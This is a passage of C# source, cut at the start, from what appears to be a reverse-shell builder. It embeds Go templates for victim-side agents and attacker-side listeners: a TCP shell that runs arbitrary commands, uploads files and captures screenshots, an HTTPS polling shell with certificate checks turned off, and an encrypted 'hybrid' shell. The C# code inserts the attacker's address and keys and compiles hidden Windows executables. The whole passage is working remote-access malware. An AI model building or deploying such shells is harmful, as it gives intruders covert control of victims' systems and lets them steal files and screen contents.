            connection.Read(make([]byte, (receivedBytes + FILEREADBUFFSIZE) - fileSize))
			break

        }
io.CopyN(newFile, connection, FILEREADBUFFSIZE)
receivedBytes += FILEREADBUFFSIZE
	}
	fmt.Println(""File Download Completed ! "")
	return
}
";
            }
            else
            {
                sourcefile = @"package main

import (
	""fmt""
    ""image/png""
    ""io""
    ""net""
    ""os""
    ""os/exec""
    ""runtime""
    ""strconv""
    ""strings""
    ""github.com/kbinani/screenshot""
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512
//MANAGERIP connection string to the manager
                const MANAGERIP = ""IPPORT""

func main() {
            conn, err:= net.Dial(""tcp"", MANAGERIP)
    if err != nil {
                   fmt.Println(err)
    }
    getshell(conn)
}

func getshell(conn net.Conn)  {
                    var cmdbuff[]byte
                   var command string
                   cmdbuff = make([]byte, BUFFSIZE)
	var osshell string

    for {
        recvdbytes, _:= conn.Read(cmdbuff[0:])
        command = string(cmdbuff[0:recvdbytes])

        if strings.Index(command, ""bye"") == 0 {
                        conn.Write([]byte(""Shell Disconnected""))
            			conn.Close()
                        os.Exit(0)

        } else if strings.Index(command, ""get"") == 0 {
            fname:= strings.Split(command, "" "")[1]
            fmt.Println(fname)
            finflag:= make(chan string)
            go sendFile(conn, fname, finflag)
            //<-finflag
            }            else if strings.Index(command, ""grabscreen"") == 0 {
            filenames:= getscreenshot()
            finflag:= make(chan string)
            for _, fname := range filenames {
                    go sendFile(conn, fname, finflag)
                    <-finflag
                    go removetempimages(filenames, finflag)
                //<-finflag
                }
            }    else       {
            //endcmd := ""END""
            j:= 0
  
            osshellargs:= []string{ ""/C"", command}
            if runtime.GOOS == ""linux"" {
                 osshell = ""/bin/sh""
                 osshellargs = []string{ ""-c"", command}
                }  else {
                    osshell = ""cmd""
                //cmdout, _ := exec.Command(""cmd"", ""/C"", command).Output()
                }
            execcmd:= exec.Command(osshell, osshellargs...)
  
            /*if runtime.GOOS == ""windows"" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

            cmdout, _:= execcmd.Output()
  
            if len(cmdout) <= 512 {
                    conn.Write([]byte(cmdout))
				//conn.Write([]byte(endcmd))
			}    else     {
                i:= BUFFSIZE
                  for {
                        if i > len(cmdout) {
                            conn.Write(cmdout[j: len(cmdout)])
                            break
                        }         else      {
                            conn.Write(cmdout[j: i])
                            j = i
                     }
                        i = i + BUFFSIZE
                }
                }
                cmdout = cmdout[:0]
 
        }

        }
    }

    func removetempimages(filenames[]string, finflag chan string)    {
        for _, name := range filenames {
            os.Remove(name)
    
    }
    }

    func sendFile(revConn net.Conn, fname string, finflag chan string)    {

        file, _:= os.Open(strings.TrimSpace(fname))
    
    fileInfo, err:= file.Stat()
    
    if err != nil {
            fmt.Println(err)

        return

    }
    fileSize:= padString(strconv.FormatInt(fileInfo.Size(), 10), 10)
    
    fileName:= padString(fileInfo.Name(), 64)
        //Sending filename and filesize
        revConn.Write([]byte(fileSize))
	revConn.Write([]byte(fileName))
	sendBuffer:= make([]byte, BUFFSIZE)
	//sending file contents
	for {
            _, err = file.Read(sendBuffer)

        if err == io.EOF {
                break

        }
            revConn.Write(sendBuffer)

    }
        finflag <-""file sent""
    
    //Completed file sending
        return
    }

    func padString(retunString string, toLength int) string {
	for {
		lengtString := len(retunString)
		if lengtString<toLength {
			retunString = retunString + "":""
			continue
		}
		break
	}
	return retunString
}
func getscreenshot() [] string {
	n := screenshot.NumActiveDisplays()
    filenames := [] string{}
	var fpth string
	for i := 0; i<n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

        img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			panic(err)
		}
		if runtime.GOOS == ""windows"" {
			fpth = `C:\Windows\Temp\`
		} else {
			fpth = `/tmp/`
		}
		fileName := fmt.Sprintf(""Scr-%d-%dx%d.png"", i, bounds.Dx(), bounds.Dy())
		fullpath := fpth + fileName
        filenames = append(filenames, fullpath)

        file, _ := os.Create(fullpath)

        defer file.Close()
        png.Encode(file, img)

		//fmt.Printf(""#%d : %v \""%s\""\n"", i, bounds, fileName)
	}
	return filenames
}

";
            }
            if (IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            SharedProps.GetInstance.OutFilePath = outpath;

            if (isManager)
            {
                sourcefile = sourcefile.Replace("REVPRT", ipport);
            }
            else
            {
                sourcefile = sourcefile.Replace("IPPORT", ipport);

                /*string ip = ipport.Split(new char[] { ':' })[0];
                string port = ipport.Split(new char[] { ':' })[1];
                sourcefile = sourcefile.Replace("RPORT", port);
                sourcefile = sourcefile.Replace("RHOST", ip);*/
            }
            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, isManager);
            //File.Delete(outpath);
        }

        public void UpdateHttpsShellTemplate(string ipport, string filename, string agentname, bool isManager)
        {

            string outpath, sourcefile;
            if (isManager)
            {
                sourcefile = @"package main

import (
	""bufio""
	""fmt""
	""html/template""
	""net/http""
	""os""
	
	""github.com/fatih/color""
)

type ServCommand struct {
	Command    string
	Commandres string
}

var commandtopost ServCommand
var servtemplate *template.Template

func init() {
	commandtopost = ServCommand{}
	servtemplate = template.Must(template.ParseFiles(""templates/servstemplate.html""))
}

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {
	http.HandleFunc(""/"", index)
	err := http.ListenAndServeTLS("":REVPRT"", ""server.crt"", ""server.key"", nil)
	checkerr(err)
}

func index(respwrt http.ResponseWriter, req *http.Request) {
	blcc := color.New(color.FgHiBlue, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	if req.Method == ""POST"" {
		err := req.ParseForm()
		checkerr(err)
		cmdres := req.Form.Get(""cmdres"")
		commandtopost.Commandres = cmdres
		blcc.Println(""You have a message from Victim..."")
		greenc.Println(commandtopost.Commandres)
		err = servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)

		//content, _ := ioutil.ReadAll(req.Body)
		//fmt.Println(string(content))
	} else {
		blcc.Printf(""[[https]]"")
		reader := bufio.NewReader(os.Stdin)
		cmdtopost, _ := reader.ReadString('\n')
		commandtopost.Command = cmdtopost
		err := servtemplate.Execute(respwrt, commandtopost)
		checkerr(err)
	}
}
";
            }
            else
            {
                sourcefile = @"package main

import (
	""crypto/tls""
	""fmt""
	""net/http""
	""net/url""
	""os""
	""os/exec""
	""runtime""
	""strings""
	""time""

	""github.com/PuerkitoBio/goquery""
)

func checkerr(err error) {
	if err != nil {
		fmt.Println(err)
	}
}

func main() {

	var osshell string
	revserver := ""https://IPPORT""


    trp := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}

	client := &http.Client{Transport: trp}

	for {

		response, err := client.Get(revserver)
		checkerr(err)
		defer response.Body.Close()
		//cnt2, _ := ioutil.ReadAll(response.Body)
		//fmt.Println(string(cnt2))

		doc, err := goquery.NewDocumentFromResponse(response)
		checkerr(err)
		cnt, _ := doc.Find(""form div div div input"").Attr(""value"")

		if strings.TrimSpace(cnt) == """" {
			cnt = ""ipconfig""
		}
		command := strings.TrimSpace(string(cnt))
		
		if command == ""bye"" {
			client.PostForm(revserver, url.Values{""cmd"": {command}, ""cmdres"": {""Bye for now !""}})
			os.Exit(0)
		} else {
			osshellargs := []string{""/C"", command}
			if runtime.GOOS == ""windows"" {
				osshell = ""cmd""
			} else {
				osshell = ""/bin/sh""
				osshellargs = []string{""-c"", command}
			}
			execcmd := exec.Command(osshell, osshellargs...)
			/*if runtime.GOOS == ""windows"" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			out, _ := execcmd.Output()
			//fmt.Println(string(out))
			client.PostForm(revserver, url.Values{""cmd"": {command}, ""cmdres"": {string(out)}})
			//client.PostForm(revserver, url.Values{""cmd"": {command}})
			time.Sleep(3 * time.Second)
		}

	}

}
";
            }
            //curpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"basefile\", filename);
            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            if (isManager)
            {
                sourcefile = sourcefile.Replace("REVPRT", ipport);
            }
            else
            {
                sourcefile = sourcefile.Replace("IPPORT", ipport);

            }
            if (!Directory.Exists(Path.GetDirectoryName(outpath)))
            {
                Directory.CreateDirectory(Path.GetDirectoryName(outpath));
            }
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, isManager);
            File.Delete(outpath);
        }


        public void UpdateHybridShellTemplate(string ipport, string filename, string agentname, string pvtkey, string pubkey, bool isManager)
        {
            string sourcefile;
            string outpath;
            if (!isManager)
            {
                sourcefile = @"package main

import (
	""crypto/aes""
	""crypto/cipher""
	""crypto/rand""
	""crypto/rsa""
	""crypto/x509""
	""encoding/pem""
	""errors""
	""fmt""
	""io""
	""net""
	""os""
	""os/exec""
	""runtime""
	""strings""
)

//BUFFSIZE is the buffer for communication
const BUFFSIZE = 512

//MASKMANAGERIP connection string to the maskmanager
const MASKMANAGERIP = ""IPPORT""

//PUBLIC KEY
var MNGRPUBLICKEY = []byte(`HYBRIDMNGRPUBKEY`)

//PRIVATE KEY
var PRIVATEKEY = []byte(`HYBRIDCLIENTPVTKEY`)

func main() {
	conn, err := net.Dial(""tcp"", MASKMANAGERIP)
	if err != nil {
		fmt.Println(err)
	}
	getmaskedshell(conn)

}

func encryptconnection(keyval, texttoencrypt string) string {

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	cipherBlock, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(cipherBlock)
	
	if err != nil {
		fmt.Println(err)
	}

	
	nonce := make([]byte, gcm.NonceSize())
	
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	
	return string(gcm.Seal(nonce, nonce, text, nil))
}

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(MNGRPUBLICKEY)
	if block == nil {
		return nil, errors.New(""public key error"")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New(""private key error!"")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}

func getmaskedshell(conn net.Conn) {
	var keybuff, cmdbuff []byte
	var command string
	cmdbuff = make([]byte, BUFFSIZE)
	keybuff = make([]byte, 1024)
	var osshell string

	keybytes, _ := conn.Read(keybuff[0:])
	decryptedkey, err := decryptMessage(keybuff[0:keybytes])
	if err != nil {
		fmt.Println(err)
	}
	keyval := string(decryptedkey)

	for {
		recvdbytes, _ := conn.Read(cmdbuff[0:])
		decryptedcmd := decryptconnection(keyval, string(cmdbuff[0:recvdbytes]))
		command = string(decryptedcmd)
		//fmt.Println(command)
		if strings.Index(command, ""bye"") == 0 {
			msgtoencrypt := ""Good Bye :(""
			result := encryptconnection(keyval, msgtoencrypt)
			if err != nil {
				fmt.Println(err)
			}
			conn.Write([]byte(result))
			conn.Close()
			os.Exit(0)
		} else {
			j := 0

			osshellargs := []string{""/C"", command}

			if runtime.GOOS == ""linux"" {
				osshell = ""/bin/sh""
				osshellargs = []string{""-c"", command}

			} else {
				osshell = ""cmd""
			}
			execcmd := exec.Command(osshell, osshellargs...)

			/*if runtime.GOOS == ""windows"" {
				execcmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
			}*/

			cmdout, _ := execcmd.Output()
			encresult := encryptconnection(keyval, string(cmdout))
			actualres := []byte(encresult)
			//fmt.Println(decryptconnection(keyval, string(actualres)))
			if len(actualres) <= 512 {
				conn.Write([]byte(actualres))
			} else {

				i := BUFFSIZE
				for {
					if i > len(actualres) {
						conn.Write(actualres[j:len(actualres)])
						break
					} else {

						conn.Write(actualres[j:i])
						j = i
					}
					i = i + BUFFSIZE
				}

			}
			actualres = actualres[:0]
			cmdout = cmdout[:0]
		}

	}
}
";
            }
            else
            {
                sourcefile = @"package main

import (
	""bufio""
	""crypto/aes""
	""crypto/cipher""
	""crypto/rand""
	""crypto/rsa""
	""crypto/x509""
	""encoding/pem""
	""errors""
	""fmt""
	""io""
	mathrand ""math/rand""
	""net""
	""os""
	""strings""
	""time""

	""github.com/fatih/color""
)

// FILEREADBUFFSIZE Sets limit for reading file transfer buffer.
const FILEREADBUFFSIZE = 512

const LOCALPORT = "":REVPRT""


var PRIVATEKEY = []byte(`HYBRIDMNGRPVTKEY`)
var SHELLPUBLICKEY = []byte(`HYBRIDCLIENTPUBKEY`)

func main() {
	redc := color.New(color.FgHiRed, color.Bold)
	greenc := color.New(color.FgHiGreen, color.Bold)
	cyanc := color.New(color.FgCyan, color.Bold)
	var recvdcmd [512]byte
	cyanc.Println(""Hybrid Tunnell..."")
	listner, _ := net.Listen(""tcp"", LOCALPORT)
	conn, _ := listner.Accept()
	keyval := generateKey()
	encmsg, _ := encryptMessage([]byte(keyval))
	//fmt.Println(keyval)
	conn.Write(encmsg)
	for {
		reader := bufio.NewReader(os.Stdin)
		redc.Print(""[[HybridTunnel]]"")
		command, _ := reader.ReadString('\n')
		if strings.Compare(command, ""bye"") == 0 {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			conn.Close()
			os.Exit(1)
		} else {
			encmsg := []byte(encryptconnection(keyval, command))
			conn.Write(encmsg)
			alldata := make([]byte, 0, 4096) // big buffer

			for {
				chunkbytes, _ := conn.Read(recvdcmd[0:])
				if chunkbytes < 512 {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)
					break
				} else {
					//greenc.Println(string(recvdcmd[0:chunkbytes]))
					alldata = append(alldata, recvdcmd[:chunkbytes]...)

				}
			}

			greenc.Println(decryptconnection(keyval, string(alldata)))

		}

	}

}

func encryptconnection(keyval, texttoencrypt string) string {

	text := []byte(texttoencrypt)
	key := []byte(keyval)

	// generate a new aes cipher using our 32 byte long key
	cipherBlock, err := aes.NewCipher(key)
	// if there are any errors, handle them
	if err != nil {
		fmt.Println(err)
	}

	// gcm or Galois/Counter Mode, is a mode of operation
	// for symmetric key cryptographic block ciphers
	// - https://en.wikipedia.org/wiki/Galois/Counter_Mode
	gcm, err := cipher.NewGCM(cipherBlock)
	// if any error generating new GCM
	// handle them
	if err != nil {
		fmt.Println(err)
	}

	// creates a new byte array the size of the nonce
	// which must be passed to Seal
	nonce := make([]byte, gcm.NonceSize())
	// populates our nonce with a cryptographically secure
	// random sequence
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		fmt.Println(err)
	}

	// here we encrypt our text using the Seal function
	// Seal encrypts and authenticates plaintext, authenticates the
	// additional data and appends the result to dst, returning the updated
	// slice. The nonce must be NonceSize() bytes long and unique for all
	// time, for a given key.
	return string(gcm.Seal(nonce, nonce, text, nil))
}
func generateKey() string {
	mathrand.Seed(time.Now().UnixNano())
	var keychars = []rune(""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~@#$%^&*()-_=+;:?"")
	randomkey := make([]rune, 32)
	for i := range randomkey {
		randomkey[i] = keychars[mathrand.Intn(len(keychars))]
	}
	return string(randomkey)
}

func encryptMessage(origData []byte) ([]byte, error) {
	block, _ := pem.Decode(SHELLPUBLICKEY)
	if block == nil {
		return nil, errors.New(""public key error"")
	}
	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	pub := pubInterface.(*rsa.PublicKey)
	return rsa.EncryptPKCS1v15(rand.Reader, pub, origData)
}

func decryptMessage(ciphertext []byte) ([]byte, error) {
	block, _ := pem.Decode(PRIVATEKEY)
	if block == nil {
		return nil, errors.New(""private key error!"")
	}
	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
	if err != nil {
		return nil, err
	}
	return rsa.DecryptPKCS1v15(rand.Reader, priv, ciphertext)
}c

func decryptconnection(keyval, texttodecrypt string) string {
	key := []byte(keyval)
	ciphertext := []byte(texttodecrypt)
	// if our program was unable to read the file
	// print out the reason why it can't
	c, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
	}

	gcm, err := cipher.NewGCM(c)
	if err != nil {
		fmt.Println(err)
	}

	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		fmt.Println(err)
	}

	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err)
	}
	return (string(plaintext))
}

";
            }

            if (!IsLinux())
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download\" + filename);
            }
            else
            {
                outpath = Path.Combine(Directory.GetParent(Path.GetDirectoryName(Environment.CurrentDirectory)).FullName, @"download/" + filename);

            }
            SharedProps.GetInstance.OutFilePath = outpath;

            if (isManager)
            {

                sourcefile = sourcefile.Replace("REVPRT", ipport);
                sourcefile = sourcefile.Replace("HYBRIDCLIENTPUBKEY", pubkey);

            }
            else
            {
                sourcefile = sourcefile.Replace("IPPORT", ipport);
                sourcefile = sourcefile.Replace("HYBRIDCLIENTPVTKEY", pvtkey);

            }
           
            File.WriteAllText(outpath, sourcefile);

            BuildExe(outpath, agentname, isManager);
            File.Delete(outpath);
        }

        public void BuildExe(string filename, string agentname, bool isManager)
        {
           

            ProcessStartInfo pinfo = new ProcessStartInfo();
            pinfo.CreateNoWindow = true;
            pinfo.UseShellExecute = false;
            //pinfo.Verb = "runas"; ;
            if (!IsLinux())
            {
                pinfo.FileName = "cmd.exe";
                if (!isManager)
                {
                    pinfo.Arguments = "/k go build " + "-o " + Directory.GetParent(filename).FullName + @"\" + agentname + ".exe" + " " + filename;
                }
                else
                {
                    pinfo.Arguments = "/k go build " + "-o " + Directory.GetParent(filename).FullName + @"\" + agentname + "Listener" + ".exe" + " " + filename;

                }

            }
            else
            {
                pinfo.FileName = "/bin/bash";
                string bincmd=string.Empty;
                if (!isManager)
                {
                    bincmd = "GOOS=windows GOARCH=386 go build -o " + Directory.GetParent(filename).FullName + @"/" + agentname + ".exe" + " " + filename;
                }

                else
                {
                    //bincmd = "GOOS=windows GOARCH=386 go build -o " + Directory.GetParent(filename).FullName + @"/" + agentname + "Listener" + ".exe" + " " + filename;
                    bincmd = "go build -o " + Directory.GetParent(filename).FullName + @"/" + agentname + "Listener" + " " + filename;
                }
                bincmd = bincmd.Replace("\"", "\\\"");
                pinfo.Arguments = $"-c \"{bincmd}\"";

            }
            pinfo.WindowStyle = ProcessWindowStyle.Hidden;
           
            try
            {
                // Start the process with the info we specified.
                // Call WaitForExit and then the using statement will close.
                using (Process exeProcess = Process.Start(pinfo))
                {
                    //SetParent(exeProcess.MainWindowHandle, this.Handle);
                    exeProcess.WaitForExit();
                }
            }
            catch(Exception ex)
            {
                throw ex;         
}

        }

    }
}
